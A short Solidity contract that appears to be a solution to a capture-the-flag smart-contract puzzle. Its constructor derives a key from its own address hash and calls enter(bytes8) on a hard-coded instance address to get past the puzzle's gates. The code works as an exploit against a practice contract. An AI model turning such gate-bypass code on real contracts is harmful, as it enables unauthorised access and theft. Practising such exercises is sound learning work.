// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Entrant {
    address instAddr = 0xA91c633052c1F482D0765d2c32B5Af9b3BeF61e7; //the addr of your instance
    
    constructor()  {       
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        (bool ok, ) = instAddr.call(abi.encodeWithSignature("enter(bytes8)", key));
        require(ok, "success");
    }
}